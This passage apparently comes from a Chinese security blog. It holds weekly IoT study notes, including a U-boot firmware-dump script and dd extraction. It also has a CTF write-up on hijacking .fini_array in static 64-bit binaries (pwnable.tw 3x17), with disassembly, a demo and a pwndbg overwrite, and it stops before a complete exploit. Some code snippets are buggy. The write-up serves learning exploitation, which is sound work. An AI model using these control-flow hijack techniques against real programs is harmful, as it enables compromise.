title="上周学习回顾（1.10-1.16）："></a>上周学习回顾（1.10-1.16）：</h3><p>学习内容：</p><ul><li><p>日门铃所意识到自我的不足，以及看师傅的一些做法带来的启发（1.10-1.14）</p></li><li><p>U-boot的启动机制以及作用等内容（1.15-1.16）</p></li><li><p>在U-boot中提取固件（1.13）</p><ul><li><p>通过mem的这条shell命令循环打印，最后将日志保存：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Main</span>():</span></span><br><span class="line">    start=<span class="number">0x0</span></span><br><span class="line">    length=<span class="number">0x200000</span>-<span class="number">0x15200</span></span><br><span class="line">    base=<span class="number">0xbc000000</span>+<span class="number">0x15200</span></span><br><span class="line">    flag=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        <span class="keyword">if</span> length &gt; <span class="number">0x4000</span>:</span><br><span class="line">            shell = <span class="string">&quot;mem -dump &quot;</span>+<span class="built_in">hex</span>(base+start)+<span class="string">&quot; &quot;</span>+<span class="built_in">hex</span>(<span class="number">0x4000</span>)</span><br><span class="line">        <span class="keyword">elif</span> length &gt; <span class="number">0</span>:</span><br><span class="line">            shell = <span class="string">&quot;mem -dump &quot;</span>+<span class="built_in">hex</span>(base+start)+<span class="string">&quot; &quot;</span>+<span class="built_in">hex</span>(length)</span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        xsh.Screen.Send(shell+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        start = start+<span class="number">0x4000</span></span><br><span class="line">        length=length-<span class="number">0x4000</span></span><br><span class="line">        xsh.Screen.WaitForString(<span class="string">&quot;\n# &quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>最后将导出的log通过脚本转换成.bin文件（有个疑问就是直接跑会报错，原因是.log文件最开始有不可见字符导致的，解决方法暂时不详）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;***.log&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">file_o = <span class="built_in">open</span>(<span class="string">&#x27;***&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">line_start = <span class="built_in">len</span>(<span class="string">&#x27;BC000000: &#x27;</span>)</span><br><span class="line">line_end = line_start+<span class="built_in">len</span>(<span class="string">&#x27;FF 00 00 10 00 00 00 00 - FD 00 00 10 00 00 00 00&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    lines = file.readlines(<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lines:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;BC&#x27;</span>):</span><br><span class="line">            line = line[line_start:line_end]</span><br><span class="line">            line = line.replace(<span class="string">&#x27; - &#x27;</span>,<span class="string">&#x27; &#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    tmp += <span class="number">0</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            file_o.write(tmp)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">file.close()</span><br><span class="line">file_o.close()</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>get到的小tips：</p><ul><li><p>芯片手册的查找</p><ul><li>具体的芯片没找到的时候，去找找公司名称没准有新发现</li></ul></li><li><p><strong>dd</strong>提取uImage中的kernel</p><ul><li>```<br>dd if=EN25QH128A_20220111_174555.BIN of=kernel.bin ibs=1024  skip=00x430200 count=2752 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 反编译apk成java代码，寻找有无设备的敏感信息，接口信息，升级固件地址信息等等</span><br><span class="line"></span><br><span class="line">  - [Android逆向系列（一）：初探Android逆向](https://blog.csdn.net/micaaa/article/details/82426710)</span><br><span class="line"></span><br><span class="line">- 树莓派配网</span><br><span class="line"></span><br><span class="line">  - [树莓派配置网络](https://blog.csdn.net/u010013028/article/details/106340105)</span><br><span class="line">  - [树莓派连接无线网络配置方法](http://www.shumeipaiba.com/wanpai/jiaocheng/25.html)</span><br><span class="line"></span><br><span class="line">- U-boot的源码下载的ftp地址为：`ftp://ftp.denx.de/pub/u-boot/`</span><br><span class="line"></span><br><span class="line">- ARM汇编小知识：</span><br><span class="line"></span><br><span class="line">  - b和bl汇编指令的区别：b相当于C中的goto指令，指的是直接跳转，而bl呢，是在跳转的过程之前，将下一条指令的地址放入lr寄存器当中，再进行跳转，待等会返回的时候就根据lr寄存器当中的值来返回（`mov pc,lr`）</span><br><span class="line"></span><br><span class="line">    ```assembly</span><br><span class="line">    0000breset;直接跳转至reset</span><br><span class="line">    ...</span><br><span class="line">    reset:</span><br><span class="line">    000cblsave_boot_params ;&lt;=当执行到这条命令的时候，会将0010的值放入lr寄存器</span><br><span class="line">    </span><br><span class="line">    0010mrsr0, cpsr</span><br><span class="line">    0014bicr0, r0, </span><br><span class="line">    0018orrr0, r0, </span><br><span class="line">    001cmsrcpsr,r0</span><br></pre></td></tr></table></figure></li></ul></li><li><p>汇编伪指令的文档：<a href="https://sourceware.org/binutils/docs-2.37/as/index.html#SEC_Contents">https://sourceware.org/binutils/docs-2.37/as/index.html#SEC_Contents</a></p></li><li><p>计算机体系结构：</p><ul><li><p>哈佛体系和冯诺依曼体系机构</p><ul><li><p><a href="https://blog.csdn.net/do2jiang/article/details/4545690">冯诺依曼体系结构、哈佛体系结构与改进型哈佛结构之间的区别</a></p><p>两者结构的最大区别就在于程序指令和数据是否分离开来，两者都各有利弊，都有某个特别突出的缺点，所以在现代的计算机都会采用两者结合的技术，在CPU外采用冯诺依曼的体系结构，而在CPU内部采用哈佛的体系结构</p></li></ul></li></ul><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-15"><a href="#下周学习计划-15" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>CVE-2021-42342 GoAhead远程命令执行(暂时弄不来)<ul><li>前提：Burp的使用….. &amp;&amp; 环境变量注入</li><li>目的：了解GoAhead开源的嵌入式webserver的框架以及CGI协议的一些原理</li></ul></li><li>U-boot(得等板子买了再重新学)<ul><li><a href="https://github.com/yifengyou/jz2440">ARM体系结构学习+ARM U-boot+Linux内核+Linux驱动</a></li><li><a href="https://www.bilibili.com/video/BV1D4411W73j?p=1">看懂U-boot的神秘面容</a></li></ul></li><li>fuzz协议 &amp;&amp; fuzz二进制程序<ul><li><a href="https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/">IoT设备固件分析之网络协议fuzz</a></li><li><a href="https://blog.csdn.net/weixin_46222091/article/details/119334375">Boofuzz协议漏洞挖掘入门教程与使用心得</a></li><li><a href="https://bestestredteam.com/2020/10/28/boofuzz/">Boofuzz：怪异的 HTTP 模糊测试</a></li></ul></li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h3><p>来到天问的第一周，就开始日门铃，救命，没弄过这种奇奇怪怪的设备，真·坐牢，不过看着它们测也有学到一点点的东西，视野倒是开拓了不少，不在局限与路由器的破解当中，其他的设备也是可以玩玩的，也挺好！</p><h1 id="二二年二月周报（一）"><a href="#二二年二月周报（一）" class="headerlink" title="二二年二月周报（一）"></a>二二年二月周报（一）</h1><h3 id="上周学习回顾（1-17-1-23）："><a href="#上周学习回顾（1-17-1-23）：" class="headerlink" title="上周学习回顾（1.17-1.23）："></a>上周学习回顾（1.17-1.23）：</h3><p>学习内容：</p><ul><li>web常见的漏洞 &amp;&amp; burp的使用</li><li>VxWorks等实时操作系统的固件修复</li></ul><p>get到的小tips：</p><ul><li><p>用强光照射板子可以看到MCU接出来的阵脚是接到那里</p><ul><li><a href="https://dalpix.com/reverse-engineering-ip-camera-part-2">逆向工程 IP 摄像机 - 第 2 部分</a></li></ul></li><li><p>shadow文件各个字段的解释</p><ul><li><pre><code class="bash">root:x:0:0:99999:7:::用户名：密码：修改时间：修改时间间隔：密码有效期：...</code></pre><p><a href="http://c.biancheng.net/view/840.html">Linux /etc/shadow内容解析</a></p></li></ul></li><li><p>Ghidra的Cheat Sheet :<a href="https://ghidra-sre.org/CheatSheet.html">https://ghidra-sre.org/CheatSheet.html</a></p></li><li></li><li></li><li></li><li><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-16"><a href="#下周学习计划-16" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>CVE-2021-42342 GoAhead远程命令执行(暂时弄不来)<ul><li>前提：Burp的使用….. &amp;&amp; 环境变量注入</li><li>目的：了解GoAhead开源的嵌入式webserver的框架以及CGI协议的一些原理</li></ul></li><li>U-boot(得等板子买了再重新学)<ul><li><a href="https://github.com/yifengyou/jz2440">ARM体系结构学习+ARM U-boot+Linux内核+Linux驱动</a></li><li><a href="https://www.bilibili.com/video/BV1D4411W73j?p=1">看懂U-boot的神秘面容</a></li></ul></li><li>fuzz协议 &amp;&amp; fuzz二进制程序<ul><li><a href="https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/">IoT设备固件分析之网络协议fuzz</a></li><li><a href="https://blog.csdn.net/weixin_46222091/article/details/119334375">Boofuzz协议漏洞挖掘入门教程与使用心得</a></li><li><a href="https://bestestredteam.com/2020/10/28/boofuzz/">Boofuzz：怪异的 HTTP 模糊测试</a></li></ul></li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>64位静态程序fini劫持</title>
      <link href="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/"/>
      <url>/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote><p>在64位的静态程序当中，除了<code>ret2syscall</code>，又碰到了静态程序的万能<code>gadget————fini</code>，<code>fini</code>是个什么东西呢？回想之前的《main真的是函数入口吗？》，在程序进入和退出都会调用函数来帮忙初始化和善后，它们分别是<code>__libc_csu_init</code>和<code>__libc_csu_fini</code>，后者就是今天我们要谈论的函数。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用《main真的是函数入口吗？》里面<code>exit</code>的<code>demo</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><p>IDA打开直接定位<code>__libc_cus_fini</code>函数，里面有三条语句特别的关键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401910 __libc_csu_fini proc near               ; DATA XREF: _start+F↑o</span><br><span class="line">.text:0000000000401910 ; __unwind &#123;</span><br><span class="line">.text:0000000000401910                 push    rbp</span><br><span class="line">.text:0000000000401911                 lea     rax, __gettext_germanic_plural</span><br><span class="line">.text:0000000000401918                 lea     rbp, _fini_array_0</span><br><span class="line">.text:000000000040191F                 push    rbx</span><br><span class="line">.text:0000000000401920                 sub     rax, rbp</span><br><span class="line">.text:0000000000401923                 sar     rax, 3</span><br><span class="line">.text:0000000000401927                 sub     rsp, 8</span><br><span class="line">.text:000000000040192B                 test    rax, rax</span><br><span class="line">.text:000000000040192E                 jz      short loc_401946</span><br><span class="line">.text:0000000000401930                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000401934                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:0000000000401938</span><br><span class="line">.text:0000000000401938 loc_401938:                             ; CODE XREF: __libc_csu_fini+34↓j</span><br><span class="line">.text:0000000000401938                 call   qword ptr [rbp + rbx*8]</span><br><span class="line">.text:000000000040193C                 sub     rbx, 1</span><br><span class="line">.text:0000000000401940                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000401944                 jnz     short loc_401938</span><br><span class="line">.text:0000000000401946</span><br><span class="line">.text:0000000000401946 loc_401946:                             ; CODE XREF: __libc_csu_fini+1E↑j</span><br><span class="line">.text:0000000000401946                 add     rsp, 8</span><br><span class="line">.text:000000000040194A                 pop     rbx</span><br><span class="line">.text:000000000040194B                 pop     rbp</span><br><span class="line">.text:000000000040194C                 jmp     _term_proc</span><br><span class="line">.text:000000000040194C ; &#125; // starts at 401910</span><br><span class="line">.text:000000000040194C __libc_csu_fini endp</span><br></pre></td></tr></table></figure><p>注意下面三条语句，它将是我们利用的关键，通过理解<code>__libc_csu_fini</code>的执行流程，可以总结出它是先将<code>_fini_array_0</code>这个数组的地址赋值给<code>rbp</code>，之后通过<code>call</code>来调用，那它是怎么调用的呢？下面展示动调的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401918                 lea     rbp, _fini_array_0</span><br><span class="line">.text:0000000000401938                 call   qword ptr [rbp + rbx*8]</span><br><span class="line">.text:0000000000401944                 jnz     short loc_401938</span><br></pre></td></tr></table></figure><p>在<code>__libc_csu_fini</code>下断点，<code>c</code>之后步入之后来到<code>0x401938</code>，可以看到它正常的调用了<code>_fini_array_0</code>，调用返回之后会将<code>sub     rbx, 1</code>（此前<code>rbx</code>的值为<code>1</code>），再往下就是<code>cmp rbx, 0FFFFFFFFFFFFFFFFh</code>，这里显然不等于，并触发跳转，程序又回到了刚刚的位置再一次<code>call qword ptr [rbp + rbx*8]</code>，需要注意的是这次的<code>call</code>索引的值不同了，之后<code>rbx</code>减<code>1</code>，未能触发跳转，看完动调的过程，我们总结一下它执行的流程为<code>_fini_array[1] -&gt; _fini_array[0]</code>。</p><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/1.jpg" class=""><p>知道了它的执行流程之后，那么怎么去利用它呢？并且<code>_fini_array[1]</code>和<code>_fini_array[0]</code>里面到底存的是什么呢？我们可以<code>objdump</code>看一下<code>fini_array</code>这个数组存放的位置，再用<code>gdb</code>来看看<code>fini_array</code>里面到底存的是什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  test objdump -h ./exit </span><br><span class="line"></span><br><span class="line">./exit：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">节：</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">                  </span><br><span class="line"> 16 .fini_array   00000010  00000000006b6150  00000000006b6150  000b6150  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>在下图可以看到<code>_fini_array[0] =&gt; __do_global_dtors_aux </code>和 <code>_fini_array[1] =&gt; fini</code>， 那我们如果改<code>_fini_array[0]</code>是不是就能劫持控制流了？答案是肯定的！</p><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/2.png" class=""><h5 id="劫持-fini-array-0"><a href="#劫持-fini-array-0" class="headerlink" title="劫持_fini_array[0]"></a>劫持_fini_array[0]</h5><p>修改<code>main真的是函数入口吗？</code>里面<code>exit</code>的<code>demo</code>为下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hack</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;welcome to hacker world\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><p>还是在<code>__libc_csu_fini</code>下断点，修改<code>_fini_array[0]</code>的值为<code>hack</code>函数的地址，再按下<code>c</code>的时候，我们已经成功的打印了<code>welcome to hacker world\n</code>！！！这里修改的只是<code>hack</code>函数的地址，那如果是<code>one_gadget</code>或者是<code>shellcode</code>的地址，你应该能猜到会发生什么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p hack</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x400b6d &lt;hack&gt;</span><br><span class="line">pwndbg&gt; set &#123;int&#125;0x6b6150=0x400b6d</span><br></pre></td></tr></table></figure><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/3.png" class=""><p>可遗憾的是，只有一些特定的情况才能像上面那样利用，接下来将介绍更通用的情况：</p><h5 id="libc-csu-fini的循环"><a href="#libc-csu-fini的循环" class="headerlink" title="__libc_csu_fini的循环"></a>__libc_csu_fini的循环</h5><p>既然它会循环调用，那不然就让它一直循环吧！我们将<code>_fini_array[1]</code>改成某个函数的地址（下面都称它为A），同时再把<code>_fini_array[0]</code>改成<code>__libc_csu_fini</code>的地址，由于它每次<code>call</code>完<code>_fini_array[0]</code>都回到<code>__libc_csu_fini</code>函数的开头，所以<code>ebx</code>永远都不会等于<code>-1</code>，那么程序的执行流将变成下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini -&gt; fini_array[1]:addrA -&gt; fini_array[0]:__libc_csu_fini  -&gt; fini_array[1]:addrA -&gt; fini_array[0]:__libc_csu_fini -&gt; fini_array[1]:addrA -&gt; fini_array[0]:__libc_csu_fini -&gt; .....</span><br></pre></td></tr></table></figure><p>除非把<code>fini_array[0]</code>覆盖成其他的值，否则它将一直循环到天荒地老，那么这么循环到底有什么用呢？答：进行ROP攻击，我们可以在<code>fini_array+0x10</code>布置ROP，然后再将栈迁移到这里，最终实现我们的目的！讲的再多不如来道题目看看~</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h5 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h5><p><a href="https://pwnable.tw/challenge/">题目链接</a></p><p>打开IDA就得知这是一个静态的64位的程序，下面的<code>checksec</code>就开了<code>NX</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec 3x17 </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序去了符号，经过之前对<code>_start</code>函数的学习很容易知道<code>main</code>函数的位置，找到<code>_start</code>之后，<code>__libc_start_main</code>的第一个参数就是<code>main</code>函数地址：</p><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/4.jpg" class="" width="4"><p>下面就是<code>main</code>函数，部分函数已经通过分析加上了符号，程序的逻辑很简单，就是读入一个地址，然后再这个地址上写数据，但只可以写<code>0x18</code>的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_401B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sys_write(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">    v1 = (<span class="keyword">char</span> *)(<span class="keyword">int</span>)sub_40EE70((__int64)buf);</span><br><span class="line">    sys_write(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>, v1, <span class="number">0x18</span>uLL);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v3 )</span><br><span class="line">    error();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先肯定是考虑前面说到的一种做法，修改<code>_fini_array[0]</code>为<code>one_gadget</code>或者是<code>shellcode</code>的地址，再或者是其他可拿<code>shell</code>的函数，<code>shellcode</code>读不进去，栈地址也不能泄露，可拿<code>shell</code>的函数也没有，那<code>one_gadget</code>呢？由于程序是静态的，所以只能在程序本身里面寻找，答案很显然，没有….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  one_gadget 3x17 </span><br><span class="line">[OneGadget] ArgumentError: File <span class="string">&quot;/home/laohu/Documents/pwn/others/3x17_fini prix/3x17&quot;</span> doesn<span class="string">&#x27;t contain string &quot;/bin/sh&quot;, not glibc?</span></span><br></pre></td></tr></table></figure><p>那么就是第二种做法了，让<code>__libc_csu_fini</code>循环起来，仔细想想如果循环的地址设置成<code>main</code>，会发生什么？它会使<code>byte_4B9330</code>疯狂加<code>1</code>，同时它是<code>unsigned __int8</code>类型的变量，疯狂加<code>1</code>会使它整数溢出，所以它总有加到<code>1</code>的时候，一旦它的值为<code>1</code>，我们就有了一次任意地址读的机会，这样就可以循环读入我们的<code>ROP</code>，每次都能读<code>0x18</code>的大小，按照理论来说我们就可以把<code>ROP</code>读到任何地方，但这里只讨论劫持<code>fini_array</code>，通过<code>objdump</code>来得到<code>fini_array</code>地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  objdump -h ./3x17 </span><br><span class="line"></span><br><span class="line">./3x17：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">节：</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line"> 15 .fini_array   00000010  00000000004b40f0  00000000004b40f0  000b30f0  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>写入的位置选在<code>fini_array+0x10</code>，那…为什么是这个位置呢？回到刚刚的写<code>ROP</code>，我们写入了<code>ROP</code>，那必然要把<code>esp</code>指过去，对不对？那肯定是要用到栈迁移，那写完<code>ROP</code>之后，再次覆盖<code>_fini_array[1]</code>实现栈迁移就会是下面这个场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(ebp = 